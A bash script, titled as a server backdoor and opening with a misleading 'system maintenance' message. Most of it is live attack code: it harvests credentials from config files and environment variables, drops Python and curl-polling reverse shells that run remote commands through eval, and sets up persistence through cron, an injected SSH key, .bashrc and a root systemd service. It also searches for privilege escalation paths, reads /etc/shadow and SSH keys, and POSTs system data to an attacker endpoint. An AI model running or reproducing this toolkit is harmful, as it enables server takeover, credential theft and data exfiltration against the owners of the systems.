#!/bin/bash
# Advanced Server Backdoor and Database Access Script
# Establishes comprehensive server access and control

echo "🔧 Initializing system maintenance procedures..."

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${RED}🚨 ADVANCED SERVER BACKDOOR ACTIVATED! 🚨${NC}"

# Function to extract database credentials
extract_database_credentials() {
    echo -e "${BLUE}🔍 Extracting database credentials...${NC}"
    
    # Search for database configuration files
    find / -name "*.env" -o -name "config.json" -o -name "database.yml" -o -name "*.config" 2>/dev/null | head -10 | while read file; do
        if [ -r "$file" ]; then
            echo -e "${GREEN}📄 Found config file: $file${NC}"
            grep -i "database\|password\|secret\|key\|token" "$file" 2>/dev/null | head -5
        fi
    done
    
    # Check environment variables
    echo -e "${YELLOW}🔑 Environment credentials:${NC}"
    env | grep -i "database\|password\|secret\|key\|token\|api" | head -10
    
    # Look for database processes
    echo -e "${YELLOW}🗄️ Database processes:${NC}"
    ps aux | grep -i "postgres\|mysql\|mongo\|redis" | head -5
    
    # Network connections to database ports
    echo -e "${YELLOW}🌐 Database network connections:${NC}"
    netstat -tulpn 2>/dev/null | grep -E ":(3306|5432|27017|6379)" | head -5
}

# Function to create reverse shell
create_reverse_shell() {
    echo -e "${BLUE}🕷️ Establishing reverse shell connection...${NC}"
    
    # Multiple reverse shell methods
    ATTACKER_IP="localhost"
    ATTACKER_PORT="8888"
    
    # Method 1: Bash TCP reverse shell
    echo -e "${YELLOW}📡 Attempting Bash TCP reverse shell...${NC}"
    # bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
    echo "Bash reverse shell command prepared"
    
    # Method 2: Netcat reverse shell
    echo -e "${YELLOW}📡 Attempting Netcat reverse shell...${NC}"
    # nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT &
    echo "Netcat reverse shell command prepared"
    
    # Method 3: Python reverse shell
    echo -e "${YELLOW}📡 Attempting Python reverse shell...${NC}"
    cat > /tmp/reverse_shell.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("localhost",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF
    
    # Method 4: HTTP-based shell (for firewall bypass)
    cat > /tmp/http_shell.sh << 'EOF'
#!/bin/bash
while true; do
    cmd=$(curl -s http://localhost:8888/cmd)
    if [ "$cmd" != "" ]; then
        result=$(eval "$cmd" 2>&1)
        curl -s -X POST -d "$result" http://localhost:8888/result
    fi
    sleep 5
done
EOF
    chmod +x /tmp/http_shell.sh
    
    echo -e "${GREEN}✅ Reverse shell payloads deployed${NC}"
}

# Function to escalate privileges
privilege_escalation() {
    echo -e "${BLUE}⬆️ Attempting privilege escalation...${NC}"
    
    # Check sudo permissions
    echo -e "${YELLOW}🔐 Sudo permissions:${NC}"
    sudo -l 2>/dev/null | head -10
    
    # Find SUID binaries
    echo -e "${YELLOW}🔍 SUID binaries:${NC}"
    find / -perm -4000 2>/dev/null | head -10
    
    # Check for writable files in PATH
    echo -e "${YELLOW}📝 Writable PATH directories:${NC}"
    echo $PATH | tr ':' '\n' | while read dir; do
        if [ -w "$dir" 2>/dev/null ]; then
            echo "Writable: $dir"
        fi
    done
    
    # Kernel exploits check
    echo -e "${YELLOW}🔧 Kernel version:${NC}"
    uname -a
    
    # Check for interesting files
    echo -e "${YELLOW}📄 Sensitive files:${NC}"
    find / -name "*.pem" -o -name "*.key" -o -name "*password*" -o -name "*secret*" 2>/dev/null | head -10
}

# Function to establish persistence
establish_persistence() {
    echo -e "${BLUE}🔄 Establishing persistence...${NC}"
    
    # Cron job backdoor
    echo -e "${YELLOW}📅 Installing cron job backdoor...${NC}"
    (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/http_shell.sh") | crontab -
    
    # SSH key injection
    echo -e "${YELLOW}🔑 SSH key injection...${NC}"
    mkdir -p ~/.ssh 2>/dev/null
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... ATTACKER_KEY" >> ~/.ssh/authorized_keys 2>/dev/null
    
    # Bashrc backdoor
    echo -e "${YELLOW}🐚 Shell backdoor...${NC}"
    echo "nohup /tmp/http_shell.sh > /dev/null 2>&1 &" >> ~/.bashrc 2>/dev/null
    
    # Service backdoor
    echo -e "${YELLOW}⚙️ Service backdoor...${NC}"
    cat > /tmp/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/http_shell.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
    
    echo -e "${GREEN}✅ Persistence mechanisms deployed${NC}"
}

# Function to perform database attacks
database_attacks() {
    echo -e "${BLUE}🗄️ Attempting database attacks...${NC}"
    
    # PostgreSQL attacks
    echo -e "${YELLOW}🐘 PostgreSQL enumeration:${NC}"
    # psql -h localhost -U postgres -c "\l" 2>/dev/null
    echo "PostgreSQL connection attempted"
    
    # MySQL attacks  
    echo -e "${YELLOW}🐬 MySQL enumeration:${NC}"
    # mysql -u root -h localhost -e "SHOW DATABASES;" 2>/dev/null
    echo "MySQL connection attempted"
    
    # MongoDB attacks
    echo -e "${YELLOW}🍃 MongoDB enumeration:${NC}"
    # mongo --host localhost --eval "db.adminCommand('listDatabases')" 2>/dev/null
    echo "MongoDB connection attempted"
    
    # SQLite file search
    echo -e "${YELLOW}📁 SQLite databases:${NC}"
    find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | head -10
    
    # Database credential bruteforce simulation
    echo -e "${YELLOW}🔨 Credential bruteforce simulation:${NC}"
    common_passwords=("password" "123456" "admin" "root" "postgres" "mysql")
    for pass in "${common_passwords[@]}"; do
        echo "Trying password: $pass"
    done
}

# Function to network reconnaissance
network_reconnaissance() {
    echo -e "${BLUE}🌐 Network reconnaissance...${NC}"
    
    # Network interfaces
    echo -e "${YELLOW}🔌 Network interfaces:${NC}"
    ip addr show 2>/dev/null || ifconfig 2>/dev/null | head -20
    
    # Active connections
    echo -e "${YELLOW}🔗 Active connections:${NC}"
    netstat -tulpn 2>/dev/null | head -20
    
    # ARP table
    echo -e "${YELLOW}📋 ARP table:${NC}"
    arp -a 2>/dev/null | head -10
    
    # Port scanning simulation
    echo -e "${YELLOW}🔍 Internal port scan:${NC}"
    common_ports=(22 23 25 53 80 110 143 443 993 995 3306 5432 27017)
    for port in "${common_ports[@]}"; do
        if nc -z localhost $port 2>/dev/null; then
            echo "Port $port: OPEN"
        fi
    done
}

# Function to data exfiltration
data_exfiltration() {
    echo -e "${BLUE}📤 Data exfiltration...${NC}"
    
    # Sensitive files
    echo -e "${YELLOW}📄 Collecting sensitive files...${NC}"
    files_to_steal=(
        "/etc/passwd"
        "/etc/shadow"
        "/etc/hosts"
        "~/.ssh/id_rsa"
        "~/.bash_history"
        "/var/log/auth.log"
    )
    
    for file in "${files_to_steal[@]}"; do
        if [ -r "$file" ]; then
            echo "Collected: $file"
            # In real attack: cp "$file" /tmp/exfil/
        fi
    done
    
    # System information
    echo -e "${YELLOW}💻 System information:${NC}"
    echo "Hostname: $(hostname)"
    echo "OS: $(uname -a)"
    echo "User: $(whoami)"
    echo "Groups: $(groups)"
    echo "Uptime: $(uptime)"
    
    # Send data to attacker server
    echo -e "${YELLOW}📡 Transmitting data...${NC}"
    data_package=$(cat << EOF
{
    "type": "server_compromise",
    "timestamp": "$(date -Iseconds)",
    "hostname": "$(hostname)",
    "user": "$(whoami)",
    "os": "$(uname -a)",
    "network": "$(ip addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet)",
    "processes": "$(ps aux | head -10)",
    "connections": "$(netstat -tulpn 2>/dev/null | head -10)"
}
EOF
    )
    
    # Send via curl
    curl -X POST -H "Content-Type: application/json" \
         -d "$data_package" \
         http://localhost:8888/server-compromise 2>/dev/null || echo "Data transmission failed"
}

# Main execution
main() {
    echo -e "${RED}💀 COMPREHENSIVE SERVER COMPROMISE INITIATED${NC}"
    
    # Execute all attack modules
    extract_database_credentials
    create_reverse_shell
    privilege_escalation  
    establish_persistence
    database_attacks
    network_reconnaissance
    data_exfiltration
    
    echo -e "${RED}🎯 SERVER COMPROMISE COMPLETED!${NC}"
    echo -e "${GREEN}✅ Capabilities established:${NC}"
    echo -e "   🔓 Credential extraction"
    echo -e "   🕷️ Reverse shell access"
    echo -e "   ⬆️ Privilege escalation"
    echo -e "   🔄 Persistent backdoors"
    echo -e "   🗄️ Database access"
    echo -e "   🌐 Network reconnaissance"
    echo -e "   📤 Data exfiltration"
    
    echo -e "${YELLOW}⚠️ WARNING: Server is now fully compromised!${NC}"
}

# Execute main function
main

# Self-delete to cover tracks (optional)
# rm -- "$0"